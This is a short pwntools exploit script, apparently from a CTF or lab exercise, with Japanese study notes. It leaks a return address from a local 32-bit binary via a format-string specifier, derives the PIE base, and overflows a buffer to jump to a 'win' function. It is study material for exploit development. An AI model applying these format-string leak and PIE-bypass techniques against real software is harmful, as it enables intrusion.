from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process('./vuln-32')

p.clean()
p.sendline(b'%3$p')
p.recvuntil(b'you ')
retaddr = int(p.recvline(), 16)

elf.address = retaddr - 0x11d5

log.success('base address is 0x{:x}'.format(elf.address))

payload = b'A' * 32
payload += p32(elf.sym['win'])

p.clean()
p.sendline(payload)

print(p.clean().decode())


# PIEバイパスの基本はリターンアドレスをリークさせて、デバッガやpwntoolsが表示する相対アドレスとの差異を計算する?
# 実際のアドレス - 相対アドレス = ベースアドレス
# %3$pにmainへのリターンアドレスらしきものがある
# radare2との差異を見てみる
# %3$p (retaddr) はvuln中にある命令らしく、メモリに配置される前のオフセットは0x11d5 (objdump)だった
# つまりretaddr - 0x11d5 でベースアドレスが分かる
